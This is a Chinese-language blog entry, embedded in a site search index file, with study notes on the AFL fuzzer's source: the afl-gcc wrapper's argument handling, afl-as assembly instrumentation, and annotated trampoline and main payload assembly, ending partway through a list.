<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>总结_AFL源码学习</title>
    <url>/2023/07/30/%E6%80%BB%E7%BB%93_AFL%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<h1 id="总结-AFL源码学习"><a href="#总结-AFL源码学习" class="headerlink" title="总结_AFL源码学习"></a>总结_AFL源码学习</h1><h2 id="简要"><a href="#简要" class="headerlink" title="简要"></a>简要</h2><ul>
<li>本文用于分析AFL源码，之前用了xmind, 感觉太杂了，本来想用OmniGraffle,但感觉还是差不多<ul>
<li>xmind 和 OmniGraffle 适合整理思路，不适合仔细记录</li>
</ul>
</li>
<li>用例子学习 [[总结_fuzzing101_例子]]</li>
</ul>
<h2 id="创建cmakelists-txt方便vscode调试"><a href="#创建cmakelists-txt方便vscode调试" class="headerlink" title="创建cmakelists.txt方便vscode调试"></a>创建cmakelists.txt方便vscode调试</h2><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.4</span>)</span><br><span class="line"><span class="keyword">project</span>(afl-fuzz)</span><br><span class="line"><span class="comment"># SET(CMAKE_C_COMPILER &quot;/usr/bin/clang&quot;)</span></span><br><span class="line"><span class="comment"># SET(CMAKE_CXX_COMPILER &quot;/usr/bin/clang++&quot;)</span></span><br><span class="line"><span class="keyword">SET</span>(CMAKE_C_COMPILER <span class="string">&quot;/usr/bin/gcc&quot;</span>)</span><br><span class="line"><span class="keyword">SET</span>(CMAKE_CXX_COMPILER <span class="string">&quot;/usr/bin/gcc++&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span>(CMAKE_EXPORT_COMPILE_COMMANDS <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span>(CMAKE_C_FLAGS <span class="string">&quot;$&#123;CMAKE_C_FLAGS&#125; -Wno-pointer-arith -funroll-loops -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DBIN_PATH=\\\&quot;/usr/local/bin\\\&quot;  -DAFL_PATH=\\\&quot;/usr/local/lib/afl\\\&quot; -DDOC_PATH=\\\&quot;/usr/local/share/doc/afl\\\&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_FLAGS <span class="string">&quot;$&#123;CMAKE_C_FLAGS&#125; -Wno-pointer-arith -Wno-pointer-arith -funroll-loops -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -fpermissive -funroll-loops -std=c++11 -w&quot;</span>)</span><br><span class="line"><span class="comment">#  -Wno-pointer-arith</span></span><br><span class="line"><span class="keyword">SET_SOURCE_FILES_PROPERTIES</span>(afl-fuzz.c PROPERTIES LANGUAGE C )</span><br><span class="line"><span class="keyword">add_executable</span>(afl-fuzz afl-fuzz.c)</span><br><span class="line"><span class="keyword">target_link_libraries</span>(afl-fuzz <span class="variable">$&#123;CMAKE_DL_LIBS&#125;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">SET_SOURCE_FILES_PROPERTIES</span>(afl-gcc.c PROPERTIES LANGUAGE C )</span><br><span class="line"><span class="keyword">add_executable</span>(afl-gcc afl-gcc.c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(afl-gcc <span class="variable">$&#123;CMAKE_DL_LIBS&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET_SOURCE_FILES_PROPERTIES</span>(afl-as.c PROPERTIES LANGUAGE C )</span><br><span class="line"><span class="keyword">add_executable</span>(afl-as afl-as.c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(afl-as <span class="variable">$&#123;CMAKE_DL_LIBS&#125;</span>)</span><br><span class="line"><span class="comment"># cc -O3 -funroll-loops -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DAFL_PATH=\&quot;/usr/local/lib/afl\&quot; -DDOC_PATH=\&quot;/usr/local/share/doc/afl\&quot; -DBIN_PATH=\&quot;/usr/local/bin\&quot; afl-fuzz.c -o afl-fuzz -L/opt/homebrew/opt/zlib/lib</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmake -G <span class="string">&#x27;Unix Makefiles&#x27;</span> -DCMAKE_BUILD_TYPE=Debug -B build_debug</span><br></pre></td></tr></table></figure>

<h2 id="afl-gcc-对源码插装"><a href="#afl-gcc-对源码插装" class="headerlink" title="afl-gcc-对源码插装"></a>afl-gcc-对源码插装</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><ul>
<li>[[总结_fuzzing101_例子#练习 1-Xpdf]]</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> LLVM_CONFIG=<span class="string">&quot;llvm-config-11&quot;</span></span><br><span class="line">CC=$HOME/Desktop/google_afl/afl-gcc CXX=$HOME/Desktop/google_afl/afl-g++ </span><br><span class="line"></span><br><span class="line">/home/wutang/Desktop/google_afl/afl-g++ -g -O2 -DHAVE_CONFIG_H -I.. -I. -c GHash.cc</span><br><span class="line">afl-cc <span class="number">2.57b</span> by &lt;lcamtuf@google.com&gt;</span><br><span class="line">cc_params : </span><br><span class="line">g++ -g -O2 -DHAVE_CONFIG_H -I.. -I. -c GHash.cc -B /home/wutang/Desktop/google_afl -g -O3 -funroll-loops -D__AFL_COMPILER=<span class="number">1</span> -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=<span class="number">1</span> </span><br><span class="line">over</span><br><span class="line">argv : </span><br><span class="line">/home/wutang/Desktop/google_afl/as -I .. -I . -<span class="number">-64</span> -o GHash.o /tmp/ccQVCI2H.s </span><br><span class="line">over</span><br><span class="line">afl-as <span class="number">2.57b</span> by &lt;lcamtuf@google.com&gt;</span><br><span class="line">[+] Instrumented <span class="number">435</span> <span class="built_in">locations</span> (<span class="number">64</span>-bit, non-hardened mode, ratio <span class="number">100</span>%).</span><br></pre></td></tr></table></figure>

<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><ul>
<li>如果参数个数小于2（表示没有给出任何参数），则打印程序的用法信息，并退出程序</li>
<li>根据AFL_PATH环境变量，去构造afl-as路径。</li>
</ul>
<h3 id="find-as构造afl-as路径"><a href="#find-as构造afl-as路径" class="headerlink" title="find_as构造afl-as路径"></a>find_as构造afl-as路径</h3><h4 id="标记内存构造"><a href="#标记内存构造" class="headerlink" title="标记内存构造"></a>标记内存构造</h4><ul>
<li>申请内存 44 + ALLOC_OFF_HEAD(8) + 1&#x3D;53, <code>(((u32*)(_ptr))[-2])=0xFF00FF00</code>, <code>(((u32*)(_ptr))[-1]) = 44</code>, <code>(((u8*)(_ptr))[ALLOC_S(_ptr)])=0xF0</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">x/48xb 0x000055555555a2a0</span><br><span class="line">0x55555555a2a0: 0x00 0xff 0x00 0xff 0x2c 0x00 0x00 0x00 </span><br><span class="line"><span class="comment">#               0xFF00FF00          lenth</span></span><br><span class="line"></span><br><span class="line">0x55555555a2a8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</span><br><span class="line">0x55555555a2b0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 </span><br><span class="line">0x55555555a2b8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 </span><br><span class="line">0x55555555a2c0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 </span><br><span class="line">0x55555555a2c8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</span><br><span class="line">0x55555555a2d0: 0x00 0x00 0x00 0x00 0xf0</span><br></pre></td></tr></table></figure>

<ul>
<li>拷贝内存从 0x55555555a2a8 到 0xf0 前</li>
</ul>
<h3 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h3><ul>
<li>该函数用于处理传递给包装器的命令行参数，并根据参数设置各种编译器选项。</li>
<li>包装器获取参数, 构造命令行参数 cc_params</li>
<li>第一参数 遍历<code>argv[0]</code><ul>
<li>afl-clang<ul>
<li>获取环境变量 AFL_CC 作为第一参数</li>
</ul>
</li>
<li>afl-clang++<ul>
<li>获取环境变量 AFL_CXX 作为第一参数</li>
</ul>
</li>
<li>afl-g++<ul>
<li>获取环境变量 AFL_CXX 作为第一参数</li>
</ul>
</li>
<li>afl-g++</li>
<li>获取环境变量 AFL_CC 作为第一参数</li>
<li>afl-gcj<ul>
<li>获取环境变量 AFL_GCJ 作为第一参数</li>
</ul>
</li>
</ul>
</li>
<li>后续参数解析<ul>
<li><code>-fsanitize=address</code>or  <code>-fsanitize=memory</code><ul>
<li>asan_set&#x3D;1</li>
</ul>
</li>
<li><code>FORTIFY_SOURCE</code><ul>
<li>fortify_set&#x3D;1</li>
</ul>
</li>
<li>如果有环境变量 <code>AFL_HARDEN</code><ul>
<li><code>-fstack-protector-all</code></li>
<li>如果没设置了 fortify_set  设置 <code>-D_FORTIFY_SOURCE=2</code></li>
</ul>
</li>
<li>如果设置了 asan_set<ul>
<li>设置 AFL_USE_ASAN 1</li>
</ul>
</li>
<li>asan和 msan 和 AFL_HARDEN 不能同时指定</li>
<li>获取环境变量 <code>AFL_USE_ASAN</code><ul>
<li>设置 <code>-U_FORTIFY_SOURCE</code> <code>-fsanitize=address</code></li>
</ul>
</li>
<li>获取环境变量 <code>AFL_USE_MSAN</code><ul>
<li>设置 <code>-U_FORTIFY_SOURCE</code> <code>-fsanitize=memory</code></li>
</ul>
</li>
<li>如果没设置环境变量 <code>AFL_DONT_OPTIMIZE</code> 如果关闭就设置 <code>AFL_DONT_OPTIMIZE=1</code><ul>
<li>设置 <code>-g</code></li>
<li>最加上 <code>-O3</code> <code>-funroll-loops</code> <code>-D__AFL_COMPILER=1</code> <code>-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</code></li>
</ul>
</li>
</ul>
</li>
<li>如果设置了环境变量 <code>AFL_NO_BUILTIN</code><ul>
<li>“-fno-builtin-strcmp”, “-fno-builtin-strncmp”, “-fno-builtin-strcasecmp”, “-fno-builtin-strncasecmp”, “-fno-builtin-memcmp”, “-fno-builtin-strstr”, “-fno-builtin-strcasestr”</li>
</ul>
</li>
<li>最后参数 NULL</li>
</ul>
<h3 id="execvp来执行实际的编译器"><a href="#execvp来执行实际的编译器" class="headerlink" title="execvp来执行实际的编译器"></a>execvp来执行实际的编译器</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">/home/wutang/Desktop/google_afl/afl-g++ -g -O2 -DHAVE_CONFIG_H -I.. -I. -c /home/wutang/Desktop/fuzzing_xpdf/xpdf<span class="number">-3.02</span>/goo/GHash.cc</span><br><span class="line">-&gt;</span><br><span class="line">g++ -g -O2 -DHAVE_CONFIG_H -I.. -I. -c /home/wutang/Desktop/fuzzing_xpdf/xpdf<span class="number">-3.02</span>/goo/GHash.cc -B /home/wutang/Desktop/google_afl -g -O3 -funroll-loops -D__AFL_COMPILER=<span class="number">1</span> -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=<span class="number">1</span> -###</span><br><span class="line">-&gt;</span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-g&#x27;</span> <span class="string">&#x27;-O2&#x27;</span> <span class="string">&#x27;-D&#x27;</span> <span class="string">&#x27;HAVE_CONFIG_H&#x27;</span> <span class="string">&#x27;-I&#x27;</span> <span class="string">&#x27;..&#x27;</span> <span class="string">&#x27;-I&#x27;</span> <span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;-c&#x27;</span> <span class="string">&#x27;-B&#x27;</span> <span class="string">&#x27;/home/wutang/Desktop/google_afl&#x27;</span> <span class="string">&#x27;-g&#x27;</span> <span class="string">&#x27;-O3&#x27;</span> <span class="string">&#x27;-funroll-loops&#x27;</span> <span class="string">&#x27;-D&#x27;</span> <span class="string">&#x27;__AFL_COMPILER=1&#x27;</span> <span class="string">&#x27;-D&#x27;</span> <span class="string">&#x27;FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&#x27;</span> <span class="string">&#x27;-shared-libgcc&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"></span><br><span class="line">/usr/lib/gcc/x86_64-linux-gnu/<span class="number">9</span>/cc1plus -quiet -I .. -I . -imultiarch x86_64-linux-gnu -D_GNU_SOURCE -D HAVE_CONFIG_H -D <span class="string">&quot;__AFL_COMPILER=1&quot;</span> -D <span class="string">&quot;FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span> /home/wutang/Desktop/fuzzing_xpdf/xpdf<span class="number">-3.02</span>/goo/GHash.cc -quiet -dumpbase GHash.cc <span class="string">&quot;-mtune=generic&quot;</span> <span class="string">&quot;-march=x86-64&quot;</span> -auxbase GHash -g -g -O2 -O3 -funroll-loops -fasynchronous-unwind-tables -fstack-protector-strong -Wformat -Wformat-security -fstack-clash-protection -fcf-protection -o /tmp/ccC1Zxd9.s</span><br><span class="line"></span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-g&#x27;</span> <span class="string">&#x27;-O2&#x27;</span> <span class="string">&#x27;-D&#x27;</span> <span class="string">&#x27;HAVE_CONFIG_H&#x27;</span> <span class="string">&#x27;-I&#x27;</span> <span class="string">&#x27;..&#x27;</span> <span class="string">&#x27;-I&#x27;</span> <span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;-c&#x27;</span> <span class="string">&#x27;-B&#x27;</span> <span class="string">&#x27;/home/wutang/Desktop/google_afl&#x27;</span> <span class="string">&#x27;-g&#x27;</span> <span class="string">&#x27;-O3&#x27;</span> <span class="string">&#x27;-funroll-loops&#x27;</span> <span class="string">&#x27;-D&#x27;</span> <span class="string">&#x27;__AFL_COMPILER=1&#x27;</span> <span class="string">&#x27;-D&#x27;</span> <span class="string">&#x27;FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&#x27;</span> <span class="string">&#x27;-shared-libgcc&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"></span><br><span class="line">/home/wutang/Desktop/google_afl/as -I .. -I . -<span class="number">-64</span> -o GHash.o /home/wutang/Desktop/fuzzing_xpdf/xpdf<span class="number">-3.02</span>/goo/GHash.s</span><br></pre></td></tr></table></figure>

<ul>
<li>调用 [[#afl-as]]</li>
</ul>
<h2 id="afl-as"><a href="#afl-as" class="headerlink" title="afl-as"></a>afl-as</h2><h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">/home/wutang/Desktop/google_afl/as -I .. -I . -<span class="number">-64</span> -o GHash.o /tmp/ccC1Zxd9.s</span><br></pre></td></tr></table></figure>

<h3 id="gettimeofday时间加进程pid构造随机种子"><a href="#gettimeofday时间加进程pid构造随机种子" class="headerlink" title="gettimeofday时间加进程pid构造随机种子"></a>gettimeofday时间加进程pid构造随机种子</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);</span><br><span class="line">rand_seed = tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>();</span><br><span class="line"><span class="built_in">srandom</span>(rand_seed);</span><br></pre></td></tr></table></figure>

<h3 id="edit-params设置参数"><a href="#edit-params设置参数" class="headerlink" title="edit_params设置参数"></a>edit_params设置参数</h3><ul>
<li>函数用于处理传递给GNU as的参数，添加修改后的文件名等信息。</li>
<li>获取环境变量 <code>TMPDIR</code><ul>
<li>tmp_dir</li>
</ul>
</li>
<li>获取环境变量 <code>AFL_AS</code><ul>
<li>afl_as 后面的as目录</li>
</ul>
</li>
<li>获取环境变量 <code>TEMP</code> <code>TMP</code><ul>
<li>写入tmp_dir 否则用 <code>/tmp</code></li>
</ul>
</li>
<li>申请 <code>(8+32) *8</code> 大内存</li>
<li>第一参数 <code>argv[0]</code> as 或者设置的 afl_as</li>
<li>后续参数<ul>
<li>如果有 <code>--64</code> use_64bit&#x3D;1  默认为1</li>
<li>如果有 <code>--32</code> use_64bit&#x3D;0</li>
<li>input_file 为参数尾部，这里是 <code>/tmp/ccC1Zxd9.s</code><ul>
<li>如果是 <code>-version</code> 就退出</li>
<li>如果不为 <code>/tmp/</code> <code>/var/tmp/</code> 就会设置 pass_thru&#x3D;1 不会修改指令</li>
</ul>
</li>
<li>设置尾部参数为 <code>/tmp/pid/time(NULL)</code> <code>/tmp/.afl-124181-1690797188.s</code></li>
</ul>
</li>
</ul>
<h3 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h3><ul>
<li>函数用于在适当的位置插入插桩代码。</li>
</ul>
<h4 id="读取汇编文件，写入afl汇编文件"><a href="#读取汇编文件，写入afl汇编文件" class="headerlink" title="读取汇编文件，写入afl汇编文件"></a>读取汇编文件，写入afl汇编文件</h4><ul>
<li>遍历文件内容<code>/tmp/ccC1Zxd9.s</code> , 写入文件 <code>/tmp/.afl-124181-1690797188.s</code><ul>
<li>如果设置 <code>pass_thru</code> continue</li>
<li>检测文本段<ul>
<li>函数会扫描输入的汇编代码，以确定是否在正确的文本段（<code>.text</code>）内。由于插桩是针对代码段的，因此只有当程序在代码段内时才会进行插桩处理。</li>
<li>表示处于正确的文本段内，可以进行插桩</li>
<li>检查 <code>text</code>, <code>section\t.text</code>, <code>section\t__TEXT,__text</code>, <code>section __TEXT,__text</code><ul>
<li>将 <code>instr_ok</code> 设置为 1，表示处于正确的文本段内，可以进行插桩</li>
</ul>
</li>
<li>检查 <code>section\t</code>，<code>section</code>, <code>bss\n</code>, <code>data\n</code> 让他 instr_ok&#x3D;0x<ul>
<li>将 <code>instr_ok</code> 设置为 0，表示不在文本段内，不需要进行插桩。</li>
</ul>
</li>
</ul>
</li>
<li>处理不同格式的汇编代码<ul>
<li>这部分代码主要处理一些特殊格式的汇编代码，如若发现了注释中的 <code>.code32</code> 或 <code>.code64</code>，则会跳过一些代码块，因为它们通常不需要插桩</li>
</ul>
</li>
<li>处理 Intel 语法<ul>
<li>如果当前行包含 <code>.intel_syntax</code> 或 <code>.att_syntax</code> 字符串，表示当前代码是 Intel 或 AT&amp;T 语法的汇编代码。</li>
<li><code>.intel_syntax</code> 表示在处理 Intel 语法代码，会将 <code>skip_intel</code> 设置为 1，以跳过相关代码块。</li>
<li><code>.att_syntax</code> 会将 <code>skip_intel</code> 设置为 1<ul>
<li>后面自己添加的payload有 [[#64位&amp;32位汇编payload]]</li>
</ul>
</li>
</ul>
</li>
<li>处理 <code>__asm__</code> 块<ul>
<li>如果当前行是注释行（以 <code>#</code> 开头），并且包含 <code>#APP</code> 或 <code>#NO_APP</code>，表示当前处于 <code>__asm__</code> 块内部，会将 <code>skip_app</code> 设置为 1</li>
</ul>
</li>
<li>插入条件分支插桩代码<ul>
<li><code>Conditional branch instruction (jnz, etc)</code></li>
<li>如果当前行以一个制表符 <code>\t</code> 开始，表示这是一个汇编指令。如果这个指令是条件分支指令（以 <code>j</code> 开头，但不是 <code>jmp</code>），并且随机数小于插桩概率 <code>inst_ratio</code>，则会在这个指令后面插入条件分支的插桩代码</li>
</ul>
</li>
<li>插入跳转目标插桩代码<ul>
<li>如果当前行包含 <code>:</code> 字符，表示这是一个标签。函数会判断这个标签是否是跳转目标（条件分支的目标），如果是，则会在这个标签处插入插桩代码，用于收集跳转目标的覆盖信息。</li>
</ul>
</li>
<li>输出主要插桩代码：在汇编代码的末尾，会插入一段主要的插桩代码（<code>main_payload_32</code> 或 <code>main_payload_64</code>），用于处理插桩逻辑的初始化和收尾工作<ul>
<li><code>fputs(use_64bit ? main_payload_64 : main_payload_32, outf);</code> 加到末尾？</li>
<li>[[#64位&amp;32位汇编payload]]</li>
</ul>
</li>
</ul>
</li>
<li>最后输出信息 <code>[+] Instrumented 435 locations (64-bit, non-hardened mode, ratio 100%).</code></li>
</ul>
<h4 id="最重要的代码-插入逻辑"><a href="#最重要的代码-插入逻辑" class="headerlink" title="最重要的代码-插入逻辑"></a>最重要的代码-插入逻辑</h4><ul>
<li><strong>afl的插桩相当简单粗暴，就是通过汇编的前导命令来判断这是否是一个分支或者函数，然后插入instrumentation trampoline。</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">  ^func:      - <span class="function">function entry <span class="title">point</span> <span class="params">(always instrumented)</span></span></span><br><span class="line"><span class="function">      <span class="comment">// _ZN5GHash9getLengthEv:\n\0thEv, @function\n\0G\&quot;,@progbits,_ZN5GHash9getLengthEv,comdat\n</span></span></span><br><span class="line"><span class="function">      <span class="comment">// _ZN5GHashC2Ei:\n\0C2Ei, @function\n\0ZN5GHash9getLengthEv\n\0oo/GHash.h\&quot;\n\0engthEv,comdat\n&quot;...</span></span></span><br><span class="line"><span class="function">      <span class="comment">// _ZN5GHashD2Ev:\n\0D2Ev, @function\n\0\n\0Ei\n\0xpdf/xpdf-3.02/goo/GHash.cc\&quot;\n\0ngthEv,comdat\n_</span></span></span><br><span class="line"><span class="function">  ^.L0:       - GCC branch label</span></span><br><span class="line"><span class="function">      // .L9:\n\<span class="number">0</span>:\n\<span class="number">0l</span>Pvm@PLT\n\<span class="number">0</span>Ev@PLT\n\<span class="number">0</span> <span class="number">1</span> view .LVU50\n\<span class="number">0l</span>ity_v0\n\<span class="number">02</span>/goo/GHash.cc\<span class="string">&quot;\n\0ngthEv,comdat\n</span></span></span><br><span class="line"><span class="string"><span class="function">      // .L\d</span></span></span><br><span class="line"><span class="string"><span class="function">  ^.LBB0_0:   - clang branch label (but only in clang mode)</span></span></span><br><span class="line"><span class="string"><span class="function">  ^\tjnz foo  - conditional branches</span></span></span><br><span class="line"><span class="string"><span class="function">      // \tjle\t.L28\n\0, %eax\n\0tmt 0 view .LVU87\n\0_xpdf/xpdf-3.02/goo/GString.h\&quot;\n\0gthEv,comdat\n</span></span></span><br><span class="line"><span class="string"><span class="function">      // \tjxx  x不是m</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">...but not:</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  ^# BB#0:    - clang comments</span></span></span><br><span class="line"><span class="string"><span class="function">  ^ # BB#0:   - ditto</span></span></span><br><span class="line"><span class="string"><span class="function">  ^.Ltmp0:    - clang non-branch labels</span></span></span><br><span class="line"><span class="string"><span class="function">  ^.LC0       - GCC non-branch labels</span></span></span><br><span class="line"><span class="string"><span class="function">  ^.LBB0_0:   - ditto (when in GCC mode)</span></span></span><br><span class="line"><span class="string"><span class="function">  ^\tjmp foo  - non-conditional jumps</span></span></span><br></pre></td></tr></table></figure>

<h4 id="32-64跳转指令"><a href="#32-64跳转指令" class="headerlink" title="32|64跳转指令"></a>32|64跳转指令</h4><ul>
<li>在合适时机插入跳转指令</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">    instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">          <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">  instrument_next = <span class="number">0</span>;</span><br><span class="line">  ins_lines++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="trampoline-fmt-64"><a href="#trampoline-fmt-64" class="headerlink" title="trampoline_fmt_64"></a>trampoline_fmt_64</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">        <span class="comment">// 过 `leaq` 指令，将当前栈指针 `rsp` 向下偏移 128+24 个字节，预留出一个较大的栈帧空间，用于保存寄存器内容</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span></span><br><span class="line">        <span class="comment">// 将一个立即数（可能是用作函数参数的标识符）加载到 `rcx` 寄存器中。`0x%08x` 可能是一个占位符，实际的值在代码中会被替换</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">        <span class="comment">// 这是AFL的日志记录函数，用于记录被测程序的执行路径信息，以便进行代码覆盖率的统计和模糊测试的导向。</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">        <span class="comment">// 通过 `leaq` 指令，将栈指针 `rsp` 恢复到之前的位置，撤销之前的栈帧偏移。</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>这段代码是 American Fuzzy Lop（AFL）模糊测试工具注入到被测程序中的一部分汇编级别的插桩（Instrumentation）</li>
</ul>
<h4 id="64位-32位汇编payload"><a href="#64位-32位汇编payload" class="headerlink" title="64位&amp;32位汇编payload"></a>64位&amp;32位汇编payload</h4><ul>
<li>下面每段解释  代码+解释</li>
<li>在整个 fuzzing 过程中，父进程（afl-fuzz进程）会不断地向子进程发送命令，子进程根据这些命令执行不同的操作。这样，父进程可以控制子进程的行为，例如在发现新的输入样本时，将其发送给子进程执行，然后收集覆盖率数据。而子进程则负责实际执行目标程序，并将覆盖率数据写入共享内存，供父进程收集。这样做可以有效地分担负担并提高 fuzzing 性能。<ul>
<li><code>__afl_fork_wait_loop</code> 是一个循环，在 <code>__afl_forkserver</code> 函数中用于等待父进程（afl-fuzz进程）发来的信号并执行相应的操作</li>
</ul>
</li>
</ul>
<h5 id="afl-maybe-log"><a href="#afl-maybe-log" class="headerlink" title="__afl_maybe_log"></a>__afl_maybe_log</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8* main_payload_64 = </span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL MAIN PAYLOAD (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.text\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.att_syntax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.code64\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 8\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_maybe_log:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__OpenBSD__)  || (defined(__FreeBSD__) &amp;&amp; (__FreeBSD__ &lt; 9))</span></span><br><span class="line">  <span class="string">&quot;  .byte 0x9f /* lahf */\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  lahf\n&quot;</span></span><br><span class="line">          <span class="comment">//  将标志寄存器 FLAGS 的低八位保存到 AH 寄存器中</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__OpenBSD__, etc */</span></span></span><br><span class="line">  <span class="string">&quot;  seto  %al\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Check if SHM region is already mapped. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  __afl_area_ptr(%rip), %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  testq %rdx, %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je    __afl_setup\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__afl_maybe_log</code> 包含一些汇编代码，用于在日志中记录AFL的执行状态<ul>
